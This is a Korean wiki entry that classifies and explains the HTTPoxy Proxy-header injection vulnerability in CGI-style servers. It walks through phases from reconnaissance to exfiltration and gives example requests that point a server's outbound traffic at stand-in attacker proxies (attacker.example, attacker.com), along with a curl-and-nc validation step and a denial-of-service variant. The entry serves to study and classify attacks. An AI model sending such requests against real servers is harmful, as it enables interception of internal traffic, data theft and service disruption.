---
title: HTTPoxy Header Injection
description: 
published: true
date: 2025-07-31T17:22:09.259Z
tags: attack success validation, data exfiltration, cgi proxy vulnerability scan, proxy header injection, denial of service via malicious proxy
editor: markdown
dateCreated: 2025-07-25T10:18:45.260Z
---

# HTTPoxy Header Injection

## 개요

“HTTPoxy Header Injection”은 HTTP 요청의 Proxy 헤더가 CGI 기반 웹 서버 또는 프레임워크에서 HTTP_PROXY 환경 변수로 자동 변환되며 발생하는 불일치를 악용한다. 서버 측 애플리케이션이 이 환경 변수를 신뢰하고 아웃바운드 요청 시 프록시로 사용하게 되면, 공격자는 이를 통해 SSRF, 인증 우회, 외부 연결 탈취 등의 동작을 유도할 수 있다. 이는 HTTP 요청의 헤더 구조와 서버 측 실행 환경 간 해석 기준의 불일치에서 비롯되며, 최종적으로 외부 통신 경로를 공격자가 제어하게 만든다.

## 분류

> 메타데이터 해석 불일치 (Metadata Interpretation Gap)  
> → 신원·무결성 해석 불일치 (Identity & Integrity Mismatch)  
> → HTTPoxy Header Injection

## 절차

| Phase         | Description                                                                                     |
|---------------|-------------------------------------------------------------------------------------------------|
| Reconnaissance| 웹-서버·프레임워크가 CGI / CGI-like(PHP-FPM, WSGI, Go net/http CGI …)인지 파악하고, 내부 HTTP 클라이언트(Libcurl, Go `http.Client` 등)가 존재하는지 확인한다. |
| Injection     | 요청 헤더에 `Proxy:` 헤더를 삽입하여 원하는 프록시 주소를 세팅한다. |
| Validation    | 공격자가 운영하는 프록시에서 서버의 후속 HTTP 요청이 실제로 들어오는지 확인하거나 헤더 삽입 후 로그를 통해 확인한다. |
| Exploitation  | 취약 HTTP 클라이언트가 HTTP_PROXY 값을 그대로 사용하여 서버가 내보내는 모든 HTTP 요청을 공격자 프록시로 중계, 서버가 임의 주소, 포트로 아웃바운드 연결을 열도록 강제, 악성 프록시로 무한대기, 대용량 응답을 유발해 서버 리소스를 소모시킬 수 있다. |
| Exfiltration  | 프록시 채널을 통해 획득한 토큰, 응답 데이터를 외부로 전송하거나 공격자 제어 호스트로 저장한다. |

<div style="text-align: left;">
  <img
    src="/httpoxy_header_injection.png"
    alt="HTTPoxy Header Injection 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CGI Proxy Vulnerability Scan</td>
      <td><pre><code>http
GET /index.php HTTP/1.1
Host: target.example
Proxy: http://invalid.local</code></pre></td>
      <td>Proxy 헤더를 임의 값으로 넣어 요청 지연·오류 여부를 관찰해 CGI/CGI‑like 환경에서 HTTP_PROXY 변수가 생성되는지 판단한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Injection
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Proxy Header Injection</td>
      <td><pre><code>http
GET /payment HTTP/1.1
Host: target.example
Proxy: http://attacker.example:8080</code></pre></td>
      <td>공격자가 운영하는 프록시 주소를 Proxy 헤더에 주입해 서버의 모든 이후 HTTP 요청이 공격자 프록시를 경유하도록 만든다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Proxy Request Capture</td>
      <td><pre><code>curl -H 'Proxy: 172.17.0.1:12345' 127.0.0.1</code></pre></td>
      <td>공격자가 제어하는 프록시/리스너(예: nc -l 12345)를 실행한 뒤, 해당 주소를 Proxy 헤더에 삽입하여 요청을 보낸다. 이후, 리스너에 서버로부터의 후속 HTTP 요청이 수신되는지 확인하여 취약점을 검증한다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

### Exploitation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Denial of Service via Malicious Proxy</td>
      <td><pre><code>GET /cgi-bin/script.pl HTTP/1.0
Host: victim.com
Proxy: attacker.com:8080</code></pre></td>
      <td>서버가 방화벽 등으로 인해 외부와 통신이 제한된 환경일 경우, 공격자가 지정한 프록시로의 연결 시도가 계속 실패하면서 서버의 리소스를 소모시켜 서비스 거부(Denial-of-Service)를 유발한다.</td>
      <td>[2]</td>
    </tr>
  </tbody>
</table>

### Exfiltration
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Internal Request Exfiltration via Proxy Log</td>
      <td><pre><code>GET http://example.com/ HTTP/1.1
Host: example.com
User-Agent: Go 1.1 package http
Accept-Encoding: gzip</code></pre></td>
      <td>서버의 아웃바운드 요청을 가로챈 뒤, 공격자의 프록시/리스너에 기록되는 로그를 통해 "프록시된 내부 요청(proxied internal request)"의 전체 내용(요청 라인, 헤더 등)을 확인하여 유출한다.</td>
      <td>[3]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

[1] https://httpoxy.org/  
[2] https://community.f5.com/kb/technicalarticles/httpoxy-cgi-vulnerability-asm-mitigation/278081  
[3] https://github.com/httpoxy/go-httpoxy-poc

## 기타 참고문헌

[A] https://github.com/httpoxy/php-fpm-httpoxy-poc  
